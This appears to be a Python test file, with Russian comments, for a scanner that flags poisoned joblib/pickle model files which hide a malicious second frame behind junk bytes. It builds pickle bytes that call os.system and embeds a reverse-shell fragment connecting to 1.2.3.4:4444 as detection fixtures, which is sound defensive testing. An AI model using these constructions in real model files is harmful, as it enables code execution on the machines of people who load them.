"""Регрессионный тест для parse-stop bypass в joblib.

Атака: первый pickle-фрейм прерывается raw-байтами (имитация NumpyArrayWrapper
inline data), затем следует второй фрейм с вредоносным глобалом. Обнаружен на
реальном файле adithyanm-defender/security-research-pickle-rce (HuggingFace).

Тест проверяет оба вектора обнаружения:
  1. Resync — MLS-PKL-004 (структурная аномалия)
  2. String scan — MLS-PKL-005 (embedded source payload в байтах)
"""

from __future__ import annotations

from pathlib import Path

import pytest

from poison_check.core.result import MLContext, Severity
from poison_check.detectors.blocklist_detector import BlocklistDetector
from poison_check.scanners.joblib_scanner import JoblibScanner


FIXTURES = Path(__file__).parent / "fixtures" / "malicious"


def _scan_and_detect(path: Path) -> tuple[list, list]:
    """Сканирует и детектирует, возвращает (codes, severities)."""
    scanner = JoblibScanner()
    raw = scanner.scan(path)
    detector = BlocklistDetector()
    issues = detector.analyze(raw, MLContext(framework="sklearn", confidence=0.9))
    codes = [i.code for i in issues]
    severities = [i.severity for i in issues]
    return codes, severities


class TestParseStopFixture:
    """Тесты на pre-built fixture bypass_parse_stop.joblib."""

    def test_parse_stop_emits_mls_pkl_004(self) -> None:
        """MLS-PKL-004 должен быть в результатах — обнаружена структурная аномалия."""
        path = FIXTURES / "bypass_parse_stop.joblib"
        if not path.exists():
            pytest.skip("Фикстура bypass_parse_stop.joblib не найдена")
        codes, _ = _scan_and_detect(path)
        assert "MLS-PKL-004" in codes, (
            f"MLS-PKL-004 не обнаружен. Codes: {codes}"
        )

    def test_parse_stop_os_system_detected(self) -> None:
        """os.system из второго фрейма должен быть обнаружен через resync."""
        path = FIXTURES / "bypass_parse_stop.joblib"
        if not path.exists():
            pytest.skip("Фикстура bypass_parse_stop.joblib не найдена")
        codes, severities = _scan_and_detect(path)
        # MLS-PKL-001 или PATTERN-OS-SYSTEM от BlocklistDetector/CveDetector
        dangerous_codes = {"MLS-PKL-001", "MLS-PKL-004", "PATTERN-OS-SYSTEM"}
        assert dangerous_codes & set(codes), (
            f"Вредоносный глобал не обнаружен. Codes: {codes}"
        )
        assert Severity.HIGH in severities or Severity.CRITICAL in severities, (
            f"Ожидался HIGH/CRITICAL. Severities: {severities}"
        )


class TestParseStopInline:
    """Inline-тесты с ручной opcode-конструкцией фикстур."""

    def test_resync_finds_malicious_global_in_second_frame(
        self, tmp_path: Path
    ) -> None:
        """Второй pickle-фрейм после raw-байт содержит os.system → DETECTED HIGH/CRITICAL."""
        import struct

        # Первый поток без STOP: прерван mid-stream (иначе pickletools завершится
        # нормально и не увидит raw-байты после STOP).
        first_frame = b"\x80\x02(K\x01"  # PROTO 2, MARK, SHORT_BININT(1), no STOP

        # Raw-байты: 0x05 = неизвестный opcode → прервёт pickletools.genops
        raw_interrupt = bytes([0x05, 0x00, 0x01, 0xFF]) * 20

        # Второй фрейм: os.system("echo pwned")
        cmd = b"echo pwned"
        second_frame = (
            b"\x80\x02"
            b"cos\nsystem\n"
            b"X" + struct.pack("<I", len(cmd)) + cmd
            + b"q\x00\x85Rq\x01."
        )

        path = tmp_path / "parse_stop_inline.joblib"
        path.write_bytes(first_frame + raw_interrupt + second_frame)

        codes, severities = _scan_and_detect(path)

        assert "MLS-PKL-004" in codes, f"Нет MLS-PKL-004. Codes: {codes}"
        assert Severity.HIGH in severities or Severity.CRITICAL in severities, (
            f"Нет HIGH/CRITICAL. Severities: {severities}"
        )

    def test_string_scan_detects_embedded_source_code(
        self, tmp_path: Path
    ) -> None:
        """MLS-PKL-005: embedded Python source code (import socket) обнаружен."""
        import struct

        first_frame = b"\x80\x02(K\x01"  # no STOP — mid-stream interrupt
        raw_interrupt = bytes([0x05, 0x00]) * 10
        # Embedded source code payload (как в реальном adithyanm-defender файле)
        embedded_payload = b"\nimport os, socket, subprocess\ndef reverse_shell():\n    s = socket.socket()\n    s.connect(('1.2.3.4', 4444))\n"

        path = tmp_path / "embedded_source.joblib"
        path.write_bytes(first_frame + raw_interrupt + embedded_payload)

        codes, severities = _scan_and_detect(path)

        assert "MLS-PKL-005" in codes or "MLS-PKL-004" in codes, (
            f"Embedded payload не обнаружен. Codes: {codes}"
        )

    def test_clean_joblib_no_parse_stop_false_positive(
        self, tmp_path: Path
    ) -> None:
        """Корректный joblib (один фрейм, нет ошибок) не триггерит MLS-PKL-004."""
        # Простой валидный pickle: int=42 (корректный с STOP)
        valid_pickle = b"\x80\x02K*."

        path = tmp_path / "clean.joblib"
        path.write_bytes(valid_pickle)

        codes, _ = _scan_and_detect(path)

        assert "MLS-PKL-004" not in codes, (
            f"Ложное срабатывание MLS-PKL-004 на чистом файле. Codes: {codes}"
        )
        assert "MLS-PKL-005" not in codes, (
            f"Ложное срабатывание MLS-PKL-005 на чистом файле. Codes: {codes}"
        )
